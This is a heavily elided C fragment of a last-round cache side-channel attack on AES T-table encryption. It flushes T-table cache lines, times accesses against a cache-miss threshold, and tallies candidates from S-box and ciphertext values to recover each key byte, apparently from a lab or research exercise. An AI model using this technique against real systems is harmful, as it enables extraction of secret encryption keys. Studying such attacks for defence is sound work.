...
int main()
{
  ...
  //-------------------------last-round attack for all key byte------------------------------
 ...
 for (size_t i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
 {
   ...
   for (size_t t=0;t<4;++t){//flush all lines of all T-tables
     for (l = 0; l < 16; ++l)  
     {
       probe = base + T[t] + 64 * l; 
       flush(probe);
     ...
     if (delta < MIN_CACHE_MISS_CYCLES){
        for (size_t i=0; i<4; ++i){
          ...
          for (size_t m=0;  m < 16; ++m){
            patt[sBox[16 * l + m] ^ ciphertext[b]][b]++;
          }
        }
     }
    }
  ...
  for (size_t byte = 0; byte < 256; ++byte){
    for (size_t b =0; b < 16; b++){
      patt[byte][b] = (double)patt[byte][b] / (double) NUMBER_OF_ENCRYPTIONS;
  ...
  for (size_t b= 0; b < 16; b++){
    double tmp[256];
    for (size_t byte = 0; byte < 256; ++byte)
       tmp[byte]=patt[byte][b];
    max = get_max_index(tmp, 256);  
